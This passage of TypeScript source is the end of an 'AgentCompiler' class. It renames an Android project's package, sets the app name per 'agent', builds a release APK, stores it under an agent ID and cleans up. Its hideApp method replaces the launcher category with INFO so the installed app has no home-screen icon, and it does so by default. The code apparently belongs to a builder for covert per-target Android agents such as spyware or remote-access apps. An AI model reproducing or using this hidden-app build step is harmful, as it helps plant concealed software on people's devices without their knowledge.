            this.addLog(`✅ Updated: ${path.basename(filePath)}`);
        };

        // --- 2️⃣ Replace package references in Gradle + manifest ---
        replaceInFile(gradleFile, `namespace = "${oldPackage}"`, `namespace = "${newPackage}"`);
        replaceInFile(gradleFile, `applicationId = "${oldPackage}"`, `applicationId = "${newPackage}"`);
        replaceInFile(manifestFile, `package="${oldPackage}"`, `package="${newPackage}"`);

        // --- 3️⃣ Directory paths ---
        const oldPath = path.join(srcPath, ...oldPackage.split("."));
        const newPath = path.join(srcPath, ...newPackage.split("."));

        if (fs.existsSync(oldPath)) {
            // Ensure the new directory exists
            fs.mkdirSync(newPath, {recursive: true});

            // --- 4️⃣ Copy/rename directory structure ---
            const renameAndCopyFiles = (src: string, dest: string) => {
                const items = fs.readdirSync(src);
                items.forEach(item => {
                    const srcItemPath = path.join(src, item);
                    const destItemPath = path.join(dest, item);

                    if (fs.statSync(srcItemPath).isDirectory()) {
                        // If it's a directory, recurse into it
                        fs.mkdirSync(destItemPath, {recursive: true});
                        renameAndCopyFiles(srcItemPath, destItemPath);
                    } else {
                        // If it's a file, copy and rename it
                        fs.copyFileSync(srcItemPath, destItemPath);
                    }
                });
            };

            // Call the function to copy and rename
            renameAndCopyFiles(oldPath, newPath);

            this.addLog("✅ Renamed and copied package directories");
        }

        // --- 5️⃣ Recursively update Java/Kotlin files with new package ---
        const updateJavaFiles = (dir: string) => {
            const files = fs.readdirSync(dir);
            files.forEach((file) => {
                const filePath = path.join(dir, file);
                if (fs.statSync(filePath).isDirectory()) {
                    updateJavaFiles(filePath);
                } else if (file.endsWith(".java") || file.endsWith(".kt")) {
                    replaceInFile(filePath, oldPackage, newPackage);
                }
            });
        };

        updateJavaFiles(newPath);

        // --- 6️⃣ Remove old package directories ---
        fs.rmSync(path.join(srcPath, "com", "topdown"), {recursive: true, force: true});

        this.addLog(`✅ Package renamed to: ${newPackage}`);
    }

    /**
     * Updates the Android app name in either:
     * - `res/values/strings.xml` (if `@string/app_name` is referenced), or
     * - directly in `AndroidManifest.xml` otherwise.
     *
     * This method dynamically sets the app label using `this.agentName`
     * so that each generated build has a unique name.
     *
     * @private
     * @async
     * @returns {Promise<void>} Resolves when the app name update is complete.
     *
     * @throws {Error} If `AndroidManifest.xml` is missing.
     *
     * @remarks
     * - Escapes special XML characters in the app name.
     * - Logs updates to both `strings.xml` and the manifest.
     * - If `@string/app_name` is missing, the manifest label is directly replaced.
     *
     * Example:
     * ```ts
     * await this.updateAppName();
     * // Logs:
     * // Updated strings.xml with new app name: "Agent Alpha"
     * ```
     */
    private async updateAppName(): Promise<void> {
        let projectFolder = path.join(this.tempFolder, "project");
        const manifestPath = path.join(projectFolder, "app", "src", "main", "AndroidManifest.xml");
        const stringsPath = path.join(projectFolder, "app", "src", "main", "res", "values", "strings.xml");

        // --- 1️⃣ Ensure AndroidManifest.xml exists ---
        if (!fs.existsSync(manifestPath)) {
            this.addLog(`Error: AndroidManifest.xml not found at ${manifestPath}`);
            return;
        }

        // --- 2️⃣ Read manifest content ---
        let manifestContent = fs.readFileSync(manifestPath, "utf8");

        // --- 3️⃣ Update depending on reference type ---
        if (manifestContent.includes('@string/app_name')) {
            if (!fs.existsSync(stringsPath)) {
                this.addLog(`Error: strings.xml not found at ${stringsPath}`);
                return;
            }
            let stringsContent = fs.readFileSync(stringsPath, "utf8");
            const newStringTag = `<string name="app_name">${this.agentName}</string>`;
            const newStringsContent = stringsContent.replace(/<string\s+name="app_name">.*?<\/string>/, newStringTag);
            fs.writeFileSync(stringsPath, newStringsContent, "utf8");
            this.addLog(`Updated strings.xml with new app name: "${this.agentName}"`);
        } else {
            const newLabelAttribute = `android:label="${this.agentName}"`;
            const newManifestContent = manifestContent.replace(/android:label=".*?"/, newLabelAttribute);
            fs.writeFileSync(manifestPath, newManifestContent, "utf8");
            this.addLog(`Updated AndroidManifest.xml with new app name: "${this.agentName}"`);
        }
    }

    /**
     * Hides the app from the Android launcher by replacing
     * `<category android: name="android.intent.category.LAUNCHER"/>`
     * with `<category android: name="android.intent.category.INFO"/>`
     * inside the `AndroidManifest.xml`.
     *
     * This is typically used to make the app launchable only via
     * internal triggers (e.g., background service or specific intent),
     * not directly from the home screen.
     *
     * @private
     * @async
     * @returns {Promise<void>} Resolves when the manifest is modified successfully.
     *
     * @remarks
     * - Controlled by `this.forbiddenActions["hide_app"]`.
     * - If `hide_app` is false, this method does nothing.
     * - Logs progress using `addLog()`.
     * - Uses regex that tolerates whitespace and attribute order variations.
     *
     * Example:
     * ```ts
     * await this.hideApp();
     * // Logs:
     * // Modified manifest: replaced LAUNCHER with INFO
     * ```
     */
    private async hideApp(): Promise<void> {
        const hideApp = this.forbiddenActions["hide_app"] ?? true;
        if (!hideApp) {
            return;
        }
        let projectFolder = path.join(this.tempFolder, "project");

        // --- 1️⃣ Check if manifest exists ---
        const manifestPath = path.join(projectFolder, "app", "src", "main", "AndroidManifest.xml");

        if (!fs.existsSync(manifestPath)) {
            this.addLog(`Error: AndroidManifest.xml not found at ${manifestPath}`);
            return;
        }

        // --- 2️⃣ Read manifest content ---
        let manifestContent = fs.readFileSync(manifestPath, "utf8");

        // --- 3️⃣ Replace LAUNCHER category with INFO category ---
        // Regex handles flexible whitespace and optional self-closing tag syntax
        manifestContent = manifestContent.replace(
            /<category\s+android:name="android.intent.category.LAUNCHER"\s*\/>/g,
            '<category android:name="android.intent.category.INFO" />'
        );

        // --- 4️⃣ Write updated manifest back ---
        fs.writeFileSync(manifestPath, manifestContent, "utf8");
        this.addLog(`Modified manifest: replaced LAUNCHER with INFO`);
    }

    /**
     * Executes the Gradle build process to compile the Android project into an APK.
     *
     * This method performs a clean and release build using the Gradle wrapper (`gradlew` or `gradlew.bat`)
     * from within the extracted project directory. It streams live Gradle output logs
     * through `addLog()` for real-time build tracking.
     *
     * @private
     * @async
     * @returns {Promise<void>} Resolves when the build completes successfully, rejects on failure.
     *
     * @throws {Error} If the Gradle wrapper is missing or the process exits with a non-zero code.
     *
     * @remarks
     * - Commands run:
     *   - Windows: `gradlew.bat clean assembleRelease --no-daemon`
     *   - Linux/macOS: `./gradlew clean assembleRelease --no-daemon`
     * - Logs all `stdout` and `stderr` output to your connected client.
     * - Ensures consistent error handling and cleanup.
     *
     * Example:
     * ```ts
     * try {
     *     await this.build();
     *     console.log("Build succeeded!");
     * } catch (err) {
     *     console.error("Build failed:", err);
     * }
     * ```
     */
    private async build(): Promise<void> {
        return new Promise((resolve: any, reject: any) => {
            this.addLog("⚙️ Cleaning & building APK...");
            const gradleCommand = process.platform === "win32" ? "gradlew.bat" : "./gradlew";

            const buildProcess = spawn(gradleCommand, ["clean", "assembleRelease", "--no-daemon"], {
                cwd: path.join(this.tempFolder, "project"),
                shell: true,
            });

            buildProcess.stdout.on("data", (data) => {
                this.addLog(data.toString());
            });

            buildProcess.stderr.on("data", (data) => {
                this.addLog(data.toString());
            });

            buildProcess.on("close", (code) => {
                this.addLog(`Build process exited with code ${code}`);
                if (code === 0) {
                    this.addLog("✅ Theme Compiled successfully!");
                    resolve();
                } else {
                    this.addLog("❌ Theme Compilation failed.");
                    reject(new Error(`Build failed with code ${code}`));
                }
            });
        });
    }

    /**
     * Waits for the generated `app-release.apk` to appear after the Gradle build
     * and copies it into the central Agent Store directory.
     *
     * This method retries every 2 seconds for up to 10 seconds (configurable)
     * until the APK is detected. It then copies the file to:
     * `<agentStorePath>/<agentID>.apk`
     *
     * @private
     * @async
     * @returns {Promise<void>} Resolves when the APK is successfully copied to the store.
     *
     * @throws {Error} If the APK is not found or copying fails after all retries.
     *
     * @remarks
     * - Uses retry logic with exponential waiting.
     * - Logs progress and retry attempts via `addLog()`.
     * - Ensures non-blocking filesystem operations throughout.
     *
     * Example:
     * ```ts
     * await this.copyAgentApp();
     * // Logs:
     * // 📦 Copying Agent App...
     * // ⚠️ Agent Release App isn't found yet, waiting...
     * // ✅ Agent App copied successfully!
     * ```
     */
    private async copyAgentApp(): Promise<void> {
        this.addLog("📦 Copying Agent App...");

        const agentAppPath = path.join(
            this.tempFolder,
            "project",
            "app",
            "build",
            "outputs",
            "apk",
            "release",
            "app-release.apk"
        );

        const maxRetryTime = 10000; // 10 seconds
        const retryInterval = 2000;
        let elapsedTime = 0;

        const agentStorePath = path.join(this.agentStorePath, this.agentID + ".apk");
        while (elapsedTime < maxRetryTime) {
            if (fsExtra.existsSync(agentAppPath)) {
                try {
                    await fsExtra.copy(agentAppPath, agentStorePath, {overwrite: true});
                    this.addLog("✅ Agent App copied successfully!");
                    return;
                } catch (err: any) {
                    this.addLog(`⚠️ Copy failed, retrying...`);
                }
            } else {
                this.addLog("⚠️ Agent Release App not found yet, waiting...");
            }

            await new Promise(res => setTimeout(res, retryInterval));
            elapsedTime += retryInterval;
        }

        throw new Error("❌ Failed to copy Agent App after multiple attempts!");
    }

    /**
     * Recursively deletes the temporary project folder after the build completes.
     *
     * This method attempts to remove the directory multiple times (with retries)
     * to handle transient I/O errors or delayed file locks (especially on Windows).
     *
     * @private
     * @async
     * @returns {Promise<void>} Resolves when the folder is successfully deleted.
     *
     * @remarks
     * - Retries for up to 15 seconds, waiting 3 seconds between each attempt.
     * - Logs cleanup progress and retry attempts using `addLog()`.
     * - If the folder doesn’t exist, it logs and exits immediately.
     *
     * Example:
     * ```ts
     * await this.cleanUp();
     * // Logs:
     * // 🧹 Project folder cleaned up.
     * ```
     */
    private async cleanUp(): Promise<void> {
        const folderPath = path.join(this.tempFolder);
        const maxRetryTime = 15000; // 15 seconds
        const retryInterval = 3000;  // retry every 0.5 seconds
        let elapsedTime = 0;

        while (elapsedTime < maxRetryTime) {
            try {
                await fsExtra.remove(folderPath);
                this.addLog("🧹 Project folder cleaned up.");
                return; // success, exit the function
            } catch (err: any) {
                this.addLog(`⚠️ Cleanup failed, retrying...`);
                await new Promise(res => setTimeout(res, retryInterval));
                elapsedTime += retryInterval;
            }
        }

        this.addLog("❌ Failed to clean project folder after 15 seconds.");
    }

}

export default AgentCompiler;

